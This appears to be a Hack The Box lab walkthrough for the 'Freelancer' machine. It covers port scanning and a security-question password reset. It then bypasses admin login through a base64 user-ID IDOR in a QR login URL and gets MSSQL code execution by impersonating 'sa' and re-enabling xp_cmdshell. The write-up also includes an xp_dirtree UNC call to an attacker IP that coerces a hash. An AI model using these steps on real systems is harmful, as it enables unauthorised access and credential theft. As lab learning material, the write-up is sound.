# Host file setup
```
sudo nxc smb 10.129.66.33 --generate-hosts-file /etc/hosts  
SMB         10.129.66.33    445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:freelancer.htb) (signing:True) (SMBv1:None) (Null Auth:True)
```

# Enumeration
## Open ports
```
nmap -p- --min-rate=2000 -sT -Pn dc.freelancer.htb -vv

Nmap scan report for dc.freelancer.htb (10.129.66.33)
Host is up, received user-set (0.014s latency).
rDNS record for 10.129.66.33: DC.freelancer.htb
Scanned at 2026-10-02 16:54:50 BST for 11s
Not shown: 65509 closed tcp ports (conn-refused)
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack
80/tcp    open  http             syn-ack
88/tcp    open  kerberos-sec     syn-ack
135/tcp   open  msrpc            syn-ack
139/tcp   open  netbios-ssn      syn-ack
389/tcp   open  ldap             syn-ack
445/tcp   open  microsoft-ds     syn-ack
464/tcp   open  kpasswd5         syn-ack
593/tcp   open  http-rpc-epmap   syn-ack
636/tcp   open  ldapssl          syn-ack
3268/tcp  open  globalcatLDAP    syn-ack
3269/tcp  open  globalcatLDAPssl syn-ack
5985/tcp  open  wsman            syn-ack
9389/tcp  open  adws             syn-ack
47001/tcp open  winrm            syn-ack
49664/tcp open  unknown          syn-ack
49665/tcp open  unknown          syn-ack
49666/tcp open  unknown          syn-ack
49667/tcp open  unknown          syn-ack
49671/tcp open  unknown          syn-ack
49680/tcp open  unknown          syn-ack
49681/tcp open  unknown          syn-ack
49684/tcp open  unknown          syn-ack
49689/tcp open  unknown          syn-ack
49711/tcp open  unknown          syn-ack
55297/tcp open  unknown          syn-ack
```

## Nmap
```
nmap -p 53,80,88,135,139,389,445,464,593,636,3268,3269,5985 -A --min-rate=200 -sT -Pn dc.freelancer.htb 
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-02 17:00 +0100
Nmap scan report for dc.freelancer.htb (10.129.66.33)
Host is up (0.014s latency).
rDNS record for 10.129.66.33: DC.freelancer.htb

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          nginx 1.25.5
|_http-server-header: nginx/1.25.5
|_http-title: Did not follow redirect to http://freelancer.htb/
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-10-02 21:00:52Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: freelancer.htb, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: freelancer.htb, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10|11|2012|2022|2016 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10 cpe:/o:microsoft:windows_11 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_server_2016
Aggressive OS guesses: Microsoft Windows Server 2019 (97%), Microsoft Windows 10 1909 - 2004 (96%), Microsoft Windows 10 1709 - 22H2 (94%), Microsoft Windows 10 1909 (92%), Microsoft Windows 11 24H2 - 25H2 (92%), Microsoft Windows Server 2012 R2 (92%), Microsoft Windows Server 2022 (92%), Microsoft Windows Server 2016 (90%), Microsoft Windows 10 21H2 (90%), Microsoft Windows 10 1703 or Windows 11 21H2 - 23H2 (89%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
```

# SMB (445)
Null auth enabled but not able to use it to enumerate

Guest account is disabled

# HTTP (80)
There is quite a lot of functionality on this page

There is two different user registrations, one for freelancers and one for employers

## Feroxbuster
```python
feroxbuster -u http://freelancer.htb/ -C 404,503

301      GET        0l        0w        0c http://freelancer.htb/admin => http://freelancer.htb/admin/
```

Found an admin page

![](Pasted%20image%2020261002182658.png)

Nothing obvious bypasses at the moment

# Logging in as employer 

![](Pasted%20image%2020261002183113.png)

But if i go to the logon page and try to logon as an employer, i can then go to forgot password. I am prompted for my security questions and then answering them right means i can change the password

Then ill reset the password to `Password1234!`

Then im redirected back to the logon page where i can log in as `hacker`

![](Pasted%20image%2020261002183348.png)

Now ill explore the dashbaord

# Decoding QR code

![](Pasted%20image%2020261002183735.png)

There is the option to generate a QR code to make logon easier

![](Pasted%20image%2020261002183805.png)

checking the requests this makes in my proxy shows some interesting requests

The generate endpoint generates the code and contains the PNG contents for the QR

![](Pasted%20image%2020261002184502.png)

Using curl i can request new QR codes using my session

I can also use `output <filename>` to save it to a file

```python
curl http://freelancer.htb/accounts/otp/qrcode/generate/ -H 'Cookie: csrftoken=Fi4bSgT5Q70ZR49FKmQiECDvoJOeq80E; sessionid=42hkr7ol6zil1257xws6b1u3qxe5nptt' --output qr.png
```

I can then feed this into a tool to decode the contents of the QR code

```python
zbarimg qr.png                              
QR-Code:http://freelancer.htb/accounts/login/otp/MTAwMTE=/801bc3f684a8477d1492e3c600193255/
scanned 1 barcode symbols from 1 images in 0.01 seconds
```

This gives me a URL 

![](Pasted%20image%2020261002184918.png)

Opening this in a new private window allows me to logon without any credentials

So if i can figure out how the URL is generated i should be able to logon as any user without credentials

![](Pasted%20image%2020261002185225.png)

If i decode part of the URL, it simply decodes to the user account ID

![](Pasted%20image%2020261002185308.png)

This is shown here when i request the user profiles using this ID

![](Pasted%20image%2020261002185719.png)

From my enumeration earlier i know the admin is ID `2`

So since the codes become void after 5 minutes, my theory is the final part of the URL is a randomly generated string that becomes invalidated

# Logging in as the admin via IDOR

```python
curl http://freelancer.htb/accounts/otp/qrcode/generate/ -H 'Cookie: csrftoken=Fi4bSgT5Q70ZR49FKmQiECDvoJOeq80E; sessionid=42hkr7ol6zil1257xws6b1u3qxe5nptt' --output qr.png
  % Total    % Received % Xferd  Average Speed  Time    Time    Time   Current
                                 Dload  Upload  Total   Spent   Left   Speed
100    965 100    965   0      0   4520      0                              0
```

Ill delete the old image and get a new image

```python
zbarimg qr.png
QR-Code:http://freelancer.htb/accounts/login/otp/MTAwMTE=/0889731ba95f3a9d08679a8d0392375d/
scanned 1 barcode symbols from 1 images in 0.01 seconds
```

And now i see the last section is different

```python
echo 2 | base64            
Mgo=
```

To test my theory ill just take the admins ID `2` then encode it and replace `MTAwMTE=` with the new value

```python
http://freelancer.htb/accounts/login/otp/Mgo=/0889731ba95f3a9d08679a8d0392375d/
```

Leaving me with this

![946](Pasted%20image%2020261002190149.png)

I am now logged in as the admin

Now im logged in as the admin i might be able to access the `/admin` endpoint

![](Pasted%20image%2020261002190752.png)

Just as expected

# RCE through MSSQL user impersonation

https://hacktricks.wiki/en/network-services-pentesting/pentesting-mssql-microsoft-sql-server/index.html

![](Pasted%20image%2020261002191106.png)

There is a terminal to interact with mssql which will come in handy

![](Pasted%20image%2020261002191644.png)

Nothing really in the current DB

XP_cmdshell is disabled and i cannot enabled it

```python
exec master.dbo.xp_dirtree '\\10.10.14.61\any\thing'
```

Also coercing auth back to me got me a hash for the user `sql_svc` but i cannot crack it

There is no linked servers

![](Pasted%20image%2020261002193645.png)

It looks like i can impersonate the `sa` user, which means i can enabled and execute commands over `xp_cmdshell`

![](Pasted%20image%2020261002201134.png)

Ill then set the logon at the start of the query then re enable xp_cmdshell

```python
EXECUTE AS LOGIN = 'sa'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
```

![](Pasted%20image%2020261002201240.png)

I now have code execution

However the user does not have SeImpersonatePrivilege



